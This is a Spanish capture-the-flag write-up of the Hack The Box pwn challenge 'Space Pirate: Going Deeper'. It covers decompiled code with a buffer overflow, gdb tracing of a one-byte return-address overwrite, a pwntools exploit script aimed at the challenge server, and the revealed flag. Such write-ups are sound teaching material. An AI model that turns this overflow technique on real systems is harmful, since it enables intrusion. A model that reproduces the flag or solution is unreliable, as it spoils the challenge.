---
layout: post
title: Space Pirate Going Deeper HTB
comments: true
categories: [Pwn, Writeups, HTB]
---

# Overview

Este es un reto sencillo de la plataforma [Hack the Box](https://app.hackthebox.com/challenges/Space%2520pirate%253A%2520Going%2520Deeper), comparte título con otros dos que subiré proximamente. Espero que os sirva para aprender!

![Image]({{ site.baseurl }}/images/pages/HTB-logo.png)

# Reconocimiento

Se nos da un binario con arquitectura `x86_64`, con las siguientes protecciones:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    Stripped:   No
```

Con *ghidra* descompilamos para analizar el código fuente:

```c
int main(void){
  setup();
  banner();
  puts("\x1b[1;34m");
  admin_panel(1,2,3);
  return 0;
}
```

Vemos que se llama a una función `admin_panel`, donde apreciamos una vulnerabilidad de tipo *Buffer Overflow*:

```c
void admin_panel(long param_1,long param_2,long param_3)
{
  int iVar1;
  char input_str [40];
  long input_num;
  
  input_num = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \n[*] If you want to continue, disable the mechanism or login as admin.\n",param_1,param_2,param_3);
  
  while (((input_num != 1 && (input_num != 2)) && (input_num != 3))) {
    printf(&DAT_004014e8);
    input_num = read_num();
  }
  if (input_num == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (input_num != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
  
  read(0,input_str,0x39);   //Vulnerable a Buffer Overflow (40 <- 57)

  if (((param_1 == 0xdeadbeef) && (param_2 == 0x1337c0de)) && (param_3 == 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",input_str,0x34);
    if (iVar1 != 0) {
      printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
      system("cat flag*");
      goto LAB_00400b38;
    }
  }
  printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}
```

Con esto, podemos tratar de buscar el offset hasta el *RIP*, para saltarnos la verificación y ejecutar directamente la línea que imprime la flag.

Ejecutamos con *gdb-peda*:

```bash
[...]
[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 2

[*] Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Sin embargo, no parece que estemos sobrescribiendo *RIP*, ni *RBP*:

```bash
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdbc0 --> 0x400ba0 (<__libc_csu_init>:	push   r15)
RIP: 0x400b41
```

Vamos a probar con otra letra:

```bash
[...]
[*] Username: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

Y vemos que *RIP* varía un byte:

```bash
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdbc0 --> 0x400ba0 (<__libc_csu_init>:	push   r15)
RIP: 0x400b42
```

Por lo que tenemos un **overflow de un sólo byte**, que es más que suficiente como para llegar a donde queremos (`0x400b01`):

![Image]({{ site.baseurl }}/images/posts/2024-11-06-Space-Pirate-Going-Deeper-HTB.png)

# Explotación

Para resolver el reto sólo nos faltaría mandar una cadena de `\x01` lo suficientemente larga, para ello lo haremos mediante un script en *python* utilizando la librería *pwntools*:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sp_going_deeper')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote("94.237.51.112",50014)
    else:
        return process('./sp_going_deeper')

io = start()

io.sendlineafter(">>", b"1")

payload = 57 * b'\x01'

io.sendlineafter("Input:", payload)

io.interactive()
```

Lo ejecutamos en remoto y tenemos la flag!

```bash
[+] Welcome admin! The secret message is: HTB{d1g_1n51d3..u_Cry_cry_cry}
```
